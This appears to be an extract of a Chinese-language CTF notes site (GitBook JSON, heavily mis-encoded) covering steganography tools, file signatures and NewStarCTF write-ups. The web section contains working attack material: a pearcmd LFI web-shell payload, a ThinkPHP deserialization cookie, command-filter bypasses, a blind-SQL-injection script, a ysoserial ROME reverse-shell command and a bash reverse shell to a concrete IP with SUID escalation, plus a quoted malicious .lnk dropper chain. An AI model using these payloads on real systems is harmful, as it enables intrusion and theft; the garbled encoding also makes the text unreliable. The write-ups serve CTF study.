https://mp.weixin.qq.com/s/1C98fhfoP81onob6a_v6Ag äºŒç»´ç æ‰«æå·¥å…·ï¼šQRCODEï¼Œæ‰‹æœºapp CortexScan äºŒç»´ç /æ¡å½¢ç åœ¨çº¿ï¼šhttps://online-barcode-reader.inliteresearch.com/ æ‘©æ–¯ç”µç ï¼šhttp://www.zhongguosou.com/zonghe/moersicodeconverter.aspx flag base64 ç¼–ç å ZmxhZw å›¾ç‰‡è¯¦ç»†ä¿¡æ¯ ç›´æ¥åœ¨010å†…æœç´¢flag linuxå‘½ä»¤ file binwalk foremost strings grep -a strings filename exiftool å¸¸è§æ–‡ä»¶æ ¼å¼ https://www.cnblogs.com/lwy-kitty/p/3928317.html æ–‡ä»¶æ ¼å¼ æ–‡ä»¶å¤´ æ–‡ä»¶å°¾ JPG FF D8 FF D9 PNG 89 50 4E 47 AE 42 60 82 GIF 47 49 46 38ï¼ˆGif89aï¼‰ 00 3B ZIP 50 4B 03 04ï¼ˆPKï¼‰ 50 4B RAR 52 61 72 21ï¼ˆRar!ï¼‰ 7z 37 7A BC AF 27 1C PDF %PDF- åŠ ä¸Šç‰ˆæœ¬å·å¦‚%PDF-1.4 æ£€æŸ¥åç¼€åã€æ–‡ä»¶å¤´æ˜¯å¦æ­£ç¡® ç ´ç¯æ–‡ä»¶å¤´ï¼Œä¸€å®šä¸èƒ½æ˜¾ç¤ºï¼Œç ´ç¯æ–‡ä»¶å°¾ï¼Œæ–‡ä»¶ä¸ä¸€å®šæ˜¾ç¤ºä¸æ­£å¸¸ æ¯”å¦‚è¯´æˆ‘å¯ä»¥åœ¨å›¾ç‰‡çš„æ–‡ä»¶å°¾åŠ ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå›¾ç‰‡ä»èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºã€‚ png IHDR è„šæœ¬çˆ†ç ´ï¼Œ010ä¿®æ”¹ LSB/MSBé€šé“éšå†™ ä½¿ç”¨zstegï¼ˆkaliï¼‰æ¥åˆ†æ #åˆ†ææ¯ä¸ªé€šé“ zsteg file_name #æå–é€šé“ zeteg -e 'é€šé“' æºæ–‡ä»¶ > è¾“å‡ºæ–‡ä»¶ åç›¸ï¼Œred planeç­‰ç”¨stegsolve jpg Stegdetectï¼šæ¢ç§˜åŠ å¯†æ–¹å¼ jphide outguess è§£å¯† outguess -k å¯†ç  -r æ–‡ä»¶å è¾“å‡ºæ–‡ä»¶ åŠ å¯† outguess -k å¯†ç  -d è¦éšè—çš„æ–‡ä»¶ æºå›¾ç‰‡ è¾“å‡ºå›¾ç‰‡ F5éšå†™ java Extract å›¾ç‰‡çš„ç»å¯¹è·¯å¾„ -p å¯†ç  -e è¾“å‡ºæ–‡ä»¶ é€šç”¨å›¾ç‰‡éšå†™ silenteye å¯ä»¥å°†æ–‡å­—æˆ–è€…æ–‡ä»¶éšè—åˆ°å›¾ç‰‡çš„è§£å¯†å·¥å…· gif å¸§--wpså›¾ç‰‡ zip ä¼ªåŠ å¯† ä¿®æ”¹æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 50 4B 03 04ï¼šå¤´æ–‡ä»¶æ ‡è®° å…¶åçš„ç¬¬äºŒä¸ªå­—èŠ‚ä¸º00 00 50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®° ï¼ˆå‹ç¼©åŒ…é‡Œæœ‰å‡ ä¸ªæ–‡ä»¶å°±æœ‰å‡ ä¸ªè¿™ä¸ªæ ‡å¿—ï¼‰ å…¶åçš„ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¸º09 00ï¼ˆåªè¦09éƒ¨åˆ†ä¸ºå¥‡æ•°å³å¯ï¼‰ å¤‡æ³¨ crcçˆ†ç ´ CRCæ˜¯ç”¨æ–‡ä»¶ä¿å­˜çš„å†…å®¹ä½œä¸ºæ˜æ–‡åŠ å¯†çš„ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®CRCçš„ä¸åŒåˆ¤æ–­å‡ºæ–‡ä»¶å†…å®¹æ˜¯å¦ç›¸åŒï¼Œä¹Ÿå¯ä»¥è¿›è¡Œé€†å‘ç ´è§£å¾—åˆ°æ–‡ä»¶å†…å®¹ã€‚ é€‚ç”¨äºæ–‡ä»¶å¤§å°ä¸å¤§çš„ py crc32.py reverse æ–‡ä»¶crcå€¼ï¼ˆåå…­è¿›åˆ¶ï¼‰ å·²çŸ¥æ˜æ–‡æ”»å‡» æœ‰ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶å·²çŸ¥ä¸”è¿›è¡Œå‹ç¼©ä¹‹åçš„CRCå€¼ä¸æŸä¸ªåŒ…å«æ­¤æ–‡ä»¶çš„å‹ç¼©åŒ…çš„CRCå€¼ç›¸ç­‰ã€‚ 520è¿æ–°èµ› Pngenius binwalkå‘½ä»¤å¾—åˆ°zipå‹ç¼©åŒ…ï¼Œä¸æ˜¯ä¼ªåŠ å¯†ï¼Œä¹Ÿä¸æ˜¯å¼±å¯†ç ï¼Œç”¨stegsolveæ‰“å¼€åœ¨rgbé€šé“æœ«ä½å‘ç° æˆ–è€…ç”¨zstegæ›´æ–¹ä¾¿ è§£å‹å¾—åˆ°flag EasyEncode å‹ç¼©åŒ…å¼±å¯†é’¥çˆ†ç ´ï¼Œå¾—åˆ°16è¿›åˆ¶,è½¬æ¢å¾—åˆ°unicodeç¼–ç ï¼Œå†è½¬æ¢å¾—åˆ°base64ç¼–ç ï¼Œè§£ç å¾—åˆ°flag import base64 def hex_to_bin(a): b='' for i in range(0,len(a),2): b+=chr(int(a[i:i+2],16)) return b a='5c75303035325c75303034375c75303035365c75303037615c75303036345c75303034345c75303034325c75303036655c75303034645c75303033335c75303037345c75303034355c75303035615c75303035375c75303033395c75303036625c75303036315c75303035375c75303033355c75303036655c75303035385c75303037615c75303034365c75303037615c75303035385c75303033325c75303035355c75303033305c75303036335c75303033335c75303036635c75303036365c75303034655c75303034365c75303033395c75303035365c75303036365c75303035315c75303032355c75303033335c75303034345c75303032355c75303033335c7530303434' b=hex_to_bin(a) b=b.replace('\\\\u00','') b=hex_to_bin(b).replace('%3D','=') print(b) print(base64.b64decode(b)) ä½ çŸ¥é“jså— çœ‹åˆ°pkå¼€å¤´ä»¥ä¸ºæ˜¯zipï¼Œè§£å‹åå¾—åˆ°XMLï¼Œç”¨fileå‘½ä»¤æŸ¥çœ‹ç±»å‹å¾—çŸ¥æ˜¯wordæ–‡æ¡£ ä¿®æ”¹åç¼€åä¸º.docï¼Œæ‰“å¼€ æ›´æ”¹å­—ä½“æˆ–è€…å¤åˆ¶å‡ºå»ä¼šå‘ç°å…¶å®æ˜¯base664ç¼–ç  StrangeTraffic ä¸ç†è§£ wpå†™çš„æ˜¯ è¿½è¸ªtcpæµï¼Œå¯„å­˜å™¨åœ¨å˜åŒ–ï¼Ÿè§‚å¯Ÿå‘ç°base64ç¼–ç åçš„Destã€‚ã€‚ ä¸è¿‡æä¾›äº†ä¸€ä¸ªæ€è·¯å°±æ˜¯å¯ä»¥è§‚å¯Ÿå­—æ¯æ˜¯å¦æ˜¯flagçš„base64ç¼–ç  4096 https://blog.csdn.net/weixin_46081055/article/details/125046554 åˆ°äº†éŸ³é¢‘é‚£å°±ä¸ä¼šäº† æ³¨æ„çš„ç‚¹ï¼š gapsæ‹¼å›¾çš„å‘½ä»¤ gaps --image=part_flag.jpg --size=64 --save size å›¾ç‰‡å¤§å°ï¼š960x1024 åƒç´  å¾—åˆ°çš„ç¢ç‰‡å›¾ï¼š15x16ä¸ªç¢ç‰‡ size=960/15 Python_jail ç©ºç™½å­—ç¬¦éšå†™ lsbé€šé“éšå†™ å¾—åˆ°pyæ–‡ä»¶ è¿è¡Œpyæ–‡ä»¶å¾—åˆ°flag 2021å®‰æ´µæ¯ love math æ‰“å¼€é™„ä»¶çœ‹åˆ°flagå‹ç¼©åŒ…å’Œå‡ ä¸ªtxtæ–‡ä»¶ crcçˆ†ç ´å¾—åˆ°è§£å‹å¯†ç  è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œlsbéšå†™ï¼Œæå–åå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œåªæ˜¯ç ´åäº†æ–‡ä»¶å¤´ï¼Œä¿®å¤ä¹‹å æ ¹æ®æç¤ºç”»å‡ºè‡ªå·±æ‰¾åˆ°è§£å¯†ç½‘ç«™Tupper's Self-Referential Formula Playground CyzCC_loves_LOL lolè§£å¯†å¾—åˆ°è§£å‹å¯†ç  è§£å‹åå¾—åˆ°ä¸¤å¼ å›¾ç‰‡ ä¸€å¼ brainfuckåŠ å¯† å¦ä¸€å¼ silent eyeåŠ å¯† è§£å¯†brainfuckå›¾ç‰‡Brainlollerå¾—åˆ°å¯†ç  è§£å¯†silent eyeå¾—åˆ°flag Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-11-11 16:24:38 "},"06.WriteUp/CTF/NewstarCTF.html":{"url":"06.WriteUp/CTF/NewstarCTF.html","title":"New Star CTF","keywords":"","body":"misc week5 æœ€åçš„æµé‡åˆ†æ å…ˆæŒ‰ç…§æ•°æ®åŒ…å¤§å°æ’åˆ—ï¼Œçœ‹äº†å‡ ä¸ªåŒ…å‘ç°æ˜¯sqlå¸ƒå°”ç›²æ³¨ï¼ˆä¸Šå‘¨çš„sqlæˆ‘ç”¨çš„å°±æ˜¯å¸ƒå°”ç›²æ³¨ï¼‰ã€‚ ä¸Šå›¾ä¸ºæ­£ç¡®å›æ˜¾ è¿›è¡Œè¿‡æ»¤ ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±è¡Œäº† å¥‡æ€ªçš„PDF 2 ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œæ‰“å¼€æ˜¯ã€Šæ¬ºéª—çš„è‰ºæœ¯ã€‹è¿™æœ¬ä¹¦ã€‚ğŸ˜± å®ƒæ˜¯å¿«æ·æ–¹å¼ï¼Œå¾ˆè‡ªç„¶å°±å»çœ‹å®ƒæŒ‡å‘äº†å“ªä¸ªæ–‡ä»¶ %SystemRoot%\\system32\\cmd.exe /c copy \"strange2.pdf.lnk\" %tmp%\\\\g5ZokyumBB2gDn.tmp /y for /r C:\\\\Windows\\\\System32\\\\ %i in (*ertu*.exe) do copy %i %tmp%\\\\msoia.exe /y findstr.exe\"TVNDRgAAAA\"%tmp%\\\\g5ZokyumBB2gDn.tmp>%tmp%\\\\cSi1r0uywDNvDu.tmp&%tmp%\\\\msoia.ex ç„¶åæœç´¢msoia.exeå°±å¾—åˆ°äº†ç±»ä¼¼çš„é¢˜ https://www.anquanke.com/post/id/267031 https://www.cnblogs.com/hed10ne/p/15841253.html ç›®æ ‡çš„æœ€å¤§é•¿åº¦åªæœ‰260ä¸ªå­—ç¬¦ï¼Œè€Œå‘½ä»¤è¡Œå‚æ•°çš„æœ€å¤§é•¿åº¦æ˜¯4096ä¸ªå­—ç¬¦ è¯»å–å®Œæ•´å‘½ä»¤ import sys import win32com.client # pip install pywin32 shell = win32com.client.Dispatch(\"WScript.Shell\") shortcut = shell.CreateShortCut(\"20200308-sitrep-48-covid-19.pdf.lnk\") print(shortcut.Targetpath) print(shortcut.Arguments) PS D:\\python3.8\\code> python -u \"d:\\python3.8\\code\\0.py\" C:\\Windows\\System32\\cmd.exe /c copy \"strange2.pdf.lnk\" %tmp%\\\\g5ZokyumBB2gDn.tmp /y&for /r C:\\\\Windows\\\\System32\\\\ %i in (*ertu*.exe) do copy %i %tmp%\\\\msoia.exe /y&findstr.exe \"TVNDRgAAAA\" %tmp%\\\\g5ZokyumBB2gDn.tmp>%tmp%\\\\cSi1r0uywDNvDu.tmp&%tmp%\\\\msoia.exe -decode %tmp%\\\\cSi1r0uywDNvDu.tmp %tmp%\\\\oGhPGUDC03tURV.tmp&expand %tmp%\\\\oGhPGUDC03tURV.tmp -F:* %tmp% &wscript %tmp%\\\\9sOXN6Ltf0afe7.js oGhPGUDC03tURV.tmpçš„æ–‡ä»¶å¤´æ˜¯MSCFï¼Œæ˜¯å¾®è½¯çš„.cabå‹ç¼©æ–‡ä»¶æ ¼å¼ ä½¿ç”¨å‘½ä»¤expand %tmp%\\\\oGhPGUDC03tURV.tmp -F:* è§£å‹è·¯å¾„å¾—åˆ° flagåœ¨flag.txtä¸­ jsè„šæœ¬ var e7926b8de13327f8e703624e = new ActiveXObject(\"WScript.Shell\");e7926b8de13327f8e703624e.Run (\"cmd /c mkdir %tmp%\\\\flag&&move /Y %tmp%\\\\cSi1r0uywDNvDu.tmp %tmp%\\\\flag\\\\flag.txt&\\\"%tmp%\\\\strange2.pdf\\\"\",0); Yesec no drumsticks 5 gitå·¥ä½œåŸç† workspaceï¼šå·¥ä½œåŒº--æœ¬åœ°ç›®å½•ï¼ˆæ¯”å¦‚æˆ‘git init Teståˆ›å»ºäº†ä¸€ä¸ªç©ºä»“åº“ï¼Œé‚£ä¹ˆTestè¿™ä¸ªç›®å½•å°±æ˜¯workspaceï¼‰ staging areaï¼šæš‚å­˜åŒº/ç¼“å­˜åŒº--.gitç›®å½•ä¸‹çš„indexæ–‡ä»¶ï¼ˆgit add æˆ–è€…git stashï¼‰ local repositoryï¼šç‰ˆæœ¬åº“æˆ–æœ¬åœ°ä»“åº“--.gitç›®å½•ä¸‹çš„objectsç›®å½• remote repositoryï¼šè¿œç¨‹ä»“åº“--github ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œå…¶.gitç›®å½•å¦‚ä¸‹ è§£é¢˜ indexä¸­æœ‰flag.txtæ–‡ä»¶ æ¢å¤ç¼“å­˜å·¥ä½œåŒºgit stash pop å›æ»šgit reset --hard commit_idåï¼Œè¯»å–flag.txtå¾—åˆ°flag{Yesec#1s#c@ibi} æ€»ç»“ æºç æ³„éœ² gitå›æ»š æŸ¥çœ‹å†å²ç‰ˆæœ¬ git log å›æ»šåˆ°å†å²ç‰ˆæœ¬ git reset --hard commit_id å®é™…ä¸Šå°±æ˜¯å°†HEADæŒ‡å‘commit_id gitç¼“å­˜ å°†å½“å‰å·¥ä½œåŒºç¼“å­˜ git stash æ¢å¤ç¼“å­˜ git stash pop å›æ»šåˆ°ç¼“å­˜ç‰ˆæœ¬ git reset --hard commit_id web week2 ezapi graphql æ¼æ´ï¼šhttps://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ ä½¿ç”¨è¯­æ³•ï¼šhttps://blog.csdn.net/weixin_39130261/article/details/118547853 week3 IncludeTwo æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ç»•è¿‡åç¼€åæ·»åŠ ï¼Œä½¿ç”¨pearcmd.phpç»•è¿‡ã€‚ pç¥çš„æ–‡ç« ï¼šhttps://tttang.com/archive/1312/#toc_0x06-pearcmdphp peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚(ç±»ä¼¼äºpythonä¸­çš„pip)åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£…ã€‚ ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨/usr/local/lib/php pearä¸­æœ‰ä¸€ä¸ªå‘½ä»¤config-createï¼Œé˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ payload ?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/+/tmp/hello.php ç„¶åä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«å†™å…¥/tmp/hello.phpä¸­ï¼Œæˆ‘ä»¬åªéœ€åŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚ Maybe You Have To think More 5.1.41LTS ThinkPHPæ¡†æ¶ååºåˆ—åŒ–æ¼æ´https://www.freebuf.com/vuls/269882.html è¿™é“é¢˜ååºåˆ—åŒ–ç‚¹åœ¨cookieä¸­ payload cookie: TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami ?dajs=ls flagåœ¨ç¯å¢ƒå˜é‡é‡Œã€‚ week4 So Baby RCE |`|\\/| |\\\\\\\\|\\*/i',$_GET[\"cmd\"])){ echo \"Don't Hack Me\"; }else{ system($_GET[\"cmd\"]); } }else{ show_source(__FILE__); } è¿‡æ»¤äº†å¾ˆå¤šã€‚ä¸»è¦æ˜¯ å…³é”®è¯ç»•è¿‡ é€šé…ç¬¦ï¼Œæ’å…¥ç©ºå­—ç¬¦ç»•è¿‡ç­‰ç­‰ ï¼›ç»•è¿‡ %0aæˆ–è€…&&ç»•è¿‡ /ç»•è¿‡ ls / == cd è·¯å¾„ï¼›ls è¿”å›ä¸Šçº§ç›®å½• cd .. ç©ºæ ¼ç»•è¿‡ ${IFS}ç­‰ç­‰ payload ?cmd=cd${IFS}..%0acd${IFS}..%0acd${IFS}..%0aca$1t${IFS}ffff$1llllaaaaggggg BabySSTI_Two unicodeç¼–ç ç»•è¿‡ï¼Œcatch_warningsè¢«è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ªç±»æ¯”å¦‚os._wrap_closeå°±å¥½äº†ã€‚ UnserializeThree è€ƒç‚¹ï¼špharååºåˆ—åŒ–ï¼Œ#ç»•è¿‡ æ–‡ä»¶ä¸Šä¼ ç»™å‡ºä¸Šä¼ åæ–‡ä»¶è·¯å¾„ æ³¨é‡Šä¸­æç¤ºclass.php |cmd)){ //Same point ,can you bypass me again? eval(\"#\".$this->cmd); }else{ echo \"No!\"; } } } file_exists($_GET['file']); ç»•è¿‡ é—­åˆphpæ ‡ç­¾ \\n \\r è¿™é‡Œåªèƒ½ç”¨\\rã€‚ payload cmd = \"\\rsystem('cat /flag');\"; } public function __destruct() { if(!preg_match(\"/>|cmd)){ //Same point ,can you bypass me again? eval(\"#\".$this->cmd); echo \"#\".$this->cmd; }else{ echo \"No!\".$this->cmd; } } } $phar = new Phar(\"test.phar\");//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar $phar->startBuffering(); //è®¾ç½®stub $phar->setStub(\"\"); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $a = new Evil(); $phar->setMetadata($a); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar->addFromString(\"test.txt\", \"test\"); //ç­¾åè‡ªåŠ¨è®¡ç®— $phar->stopBuffering(); ?> å°†ç”Ÿæˆçš„pharæ”¹å›¾ç‰‡åç¼€åä¸Šä¼ åï¼Œåœ¨class.phpä¸‹ç”¨pharåè®®è®¿é—®ï¼ˆåªè¦æ˜¯pharæ–‡ä»¶ï¼Œåç¼€åæ˜¯ä»€ä¹ˆéƒ½å¯ä»¥è§£æï¼‰ /class.php?file=phar://file_path åˆä¸€ä¸ªSQL 0^0å’Œ0^1ï¼Œå›æ˜¾ä¸¤ç§æƒ…å†µï¼ŒçŒœæµ‹ä½¿ç”¨ç›²æ³¨ã€‚ payload import requests import time from urllib import parse #æ•°å­— #0^(ascii(substr((select(database())),{},1))>{}) #å•å¼•å· #0' or (ascii(substr((select(database())),{},1))>{}) or '0 url=\"http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php\" url2=\"http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c\" def SqlBlind(): result=\"\" for i in range(1,1000): left = 32 right = 127 mid=(left+right)//2 while left {})\".format(i,mid), # 'name':\"c\", # 'comment':\"hack\", # 'name':\"0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))>{})\".format(i,mid), # 'name':\"0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='wfy_information')),{},1))>{})\".format(i,mid), 'name':\"0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user='f1ag_is_here')),{},1))>{})\".format(i,mid), } # è¯·æ±‚æ–¹å¼ #r=requests.get(url=url,params=params) r=requests.post(url=url,data=params) #print(r.text) # é˜²æ­¢429 if r.status_code == 429: time.sleep(0.5) #r=requests.get(url=url2) # ç¼–ç  #r=str(r.json()) # Trueçš„æ ‡å¿— 0çš„ä¸ªæ•° if \"å¥½è€¶\" in r.text: # if r.text.count('0')==i: left = mid+1 else: right = mid mid=(left+right)//2 if left = 127: break result += chr(mid) print(\"[+]\",result) if __name__ == '__main__': SqlBlind() Rome @Controller /* */ public class SerController /* */ { /* */ @GetMapping({\"/\"}) /* */ @ResponseBody /* */ public String helloCTF() { /* 19 */ return \"Do you like Jvav?\"; /* */ } /* */ @PostMapping({\"/\"}) /* */ @ResponseBody /* */ public String helloCTF(@RequestParam String EXP) throws IOException, ClassNotFoundException { /* 24 */ if (EXP.equals(\"\")) { /* 25 */ return \"Do you know Rome Serializer?\"; /* */ } /* 27 */ byte[] exp = Base64.getDecoder().decode(EXP); /* 28 */ ByteArrayInputStream bytes = new ByteArrayInputStream(exp); /* 29 */ ObjectInputStream objectInputStream = new ObjectInputStream(bytes); /* 30 */ objectInputStream.readObject(); /* 31 */ return \"Do You like Jvav?\"; /* */ } /* */ } ååºåˆ—åŒ–ç‚¹ objectInputStream.readObject(); ROMEååºåˆ—åŒ–åˆ†æ https://www.yulate.com/292.html javaç‰ˆæœ¬è¦jdk8u-121ç…§ç€æ–‡ç« æœ¬åœ°å¤ç°äº†ï¼Œä½†æ˜¯ç”¨ysoserialå†™äº†åå¼¹shellï¼Œé¢˜ç›®çš„å‘é€è¿‡å»ä¸å¯ä»¥ è¿™å‘¨å‘ç°åªè¦æŠŠpayloadæ‹¿å»urlç¼–ç åå°±å¯ä»¥äº†ã€‚ è¿™é‡Œæ€è€ƒäº†å¾—å‡ºçš„ç»“æœæ˜¯ RFC3986ä¸­æŒ‡å®šäº†ä»¥ä¸‹å­—ç¬¦ä¸ºä¿ç•™å­—ç¬¦ï¼š! * ' ( ) ; : @ & = + $ , / ? # [ ] ã€€ã€€ä¸å®‰å…¨å­—ç¬¦ï¼šè¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼Œå½“ä»–ä»¬ç›´æ¥æ”¾åœ¨URLä¸­çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¼•èµ·è§£æç¨‹åºçš„æ­§ä¹‰ã€‚è¿™äº›å­—ç¬¦è¢«è§†ä¸ºä¸å®‰å…¨å­—ç¬¦ï¼ŒåŸå› æœ‰å¾ˆå¤šã€‚ ç©ºæ ¼ï¼šUrl åœ¨ä¼ è¾“çš„è¿‡ç¨‹ï¼Œæˆ–è€…ç”¨æˆ·åœ¨æ’ç‰ˆçš„è¿‡ç¨‹ï¼Œæˆ–è€…æ–‡æœ¬å¤„ç†ç¨‹åºåœ¨å¤„ç†Urlçš„è¿‡ç¨‹ï¼Œéƒ½æœ‰å¯èƒ½å¼•å…¥æ— å…³ç´§è¦çš„ç©ºæ ¼ï¼Œæˆ–è€…å°†é‚£äº›æœ‰æ„ä¹‰çš„ç©ºæ ¼ç»™å»æ‰ã€‚ å¼•å·ä»¥åŠ<>ï¼šå¼•å·å’Œå°–æ‹¬å·é€šå¸¸ç”¨äºåœ¨æ™®é€šæ–‡æœ¬ä¸­èµ·åˆ°åˆ†éš”Urlçš„ä½œç”¨ #ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹ %ï¼šç™¾åˆ†å·æœ¬èº«ç”¨ä½œå¯¹ä¸å®‰å…¨å­—ç¬¦è¿›è¡Œç¼–ç æ—¶ä½¿ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤æœ¬èº«éœ€è¦ç¼–ç  {}|\\^[]`~ï¼šæŸä¸€äº›ç½‘å…³æˆ–è€…ä¼ è¾“ä»£ç†ä¼šç¯¡æ”¹è¿™äº›å­—ç¬¦ è€Œbase64åŠ å¯†åå¯èƒ½ä¼šå‡ºç°+,/,= è§£é¢˜æ­¥éª¤ java -jar ysoserial.jar ROME \"bash -c {echo,xxx}|{base64,-d}|{bash,-i}\" > 1.txt xxxä¸ºbase64åçš„bash -i >& /dev/tcp/ip/2333 0>&1 è¿™é‡Œ> 1.txtæ˜¯å› ä¸ºå¦‚æœæˆ‘åŠ äº†|base64ç”Ÿæˆäº†ä¹‹åä¼šå‡ºç°å…¶ä»–ç¬¦å· ç”¨pythonæˆ–è€…cyberchefæ¥base64åŠ å¯† exp EXP=å¯¹ä¸Šé¢ç”Ÿæˆçš„base64å†è¿›è¡Œurlç¼–ç  è¿æ¥åflagåœ¨æ ¹ç›®å½• week 5 So Baby RCE Again ç›´æ¥åˆ©ç”¨>å†™å…¥æœ¨é©¬ï¼Œç„¶åä¸€å¼€å§‹ä½¿ç”¨èšå‰‘è¿æ¥ è¯»å–æ ¹ç›®å½•ä¸‹çš„start.sh #!/bin/bash echo $FLAG > /ffll444aaggg && export FLAG=not && FLAG=not && chmod 700 /ffll444aaggg && \\ service apache2 restart && \\ tail -f /dev/null è¿™é‡Œchmod 700 /ffll444aagggçš„æ„æ€å°±æ˜¯/ffll444aagggåªæœ‰rootç”¨æˆ·å¯ä»¥è®¿é—®ã€‚ ç„¶åç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯ç”¨suidææƒï¼Œå› ä¸ºä¹‹å‰å“ªä¸€å‘¨çš„miscæ˜¯ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚ ä½†æ˜¯æ²¡æœ‰æƒ³åˆ°çš„æ˜¯èšå‰‘çš„ç»ˆç«¯å¤ªä¸å¥½ç”¨äº†ï¼ˆå…¶å®æˆ‘ä¹‹å‰è§‰å¾—èšå‰‘æŒºå¼ºçš„ï¼Œå› ä¸ºå®ƒè‡ªå¸¦é‚£äº›ç»•è¿‡æ’ä»¶ï¼‰ æ¯”å¦‚å˜é‡èµ‹å€¼æ²¡ç”¨ æŸ¥æ‰¾å…·æœ‰suidçš„å‘½ä»¤æ²¡ç”¨ åå¼¹shell bash -c 'bash -i >& /dev/tcp/120.77.73.212/2333 0>&1' www-data@out:/$ find / -user root -perm -4000 -print 2>/dev/null find / -user root -perm -4000 -print 2>/dev/null /bin/date /bin/mount /bin/su /bin/umount www-data@out:/$ date -f ffll444aaggg date -f ffll444aaggg date: invalid date 'flag{1f005b40-39e2-4538-8816-3e27bdd98352}' final round æ—¶é—´ç›²æ³¨ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-22 10:47:42 "},"06.WriteUp/CTF/NodeJs.html":{"url":"06.WriteUp/CTF/NodeJs.html","title":"NodeJsç›¸å…³","keywords":"","body":"nodejsåŸºç¡€ ä½¿ç”¨ Node.js æ—¶ï¼Œæˆ‘ä»¬ä¸ä»…ä»… åœ¨å®ç°ä¸€ä¸ªåº”ç”¨ï¼ŒåŒæ—¶è¿˜å®ç°äº†æ•´ä¸ª HTTP æœåŠ¡å™¨ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬çš„ Web åº”ç”¨ä»¥åŠå¯¹åº”çš„ Web æœåŠ¡å™¨åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ã€‚ åœ¨æˆ‘ä»¬åˆ›å»º Node.js ç¬¬ä¸€ä¸ª \"Hello, World!\" åº”ç”¨å‰ï¼Œè®©æˆ‘ä»¬å…ˆäº†è§£ä¸‹ Node.js åº”ç”¨æ˜¯ç”±å“ªå‡ éƒ¨åˆ†ç»„æˆçš„ï¼š å¼•å…¥ required æ¨¡å—ï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ require æŒ‡ä»¤æ¥è½½å…¥ Node.js æ¨¡å—ã€‚ 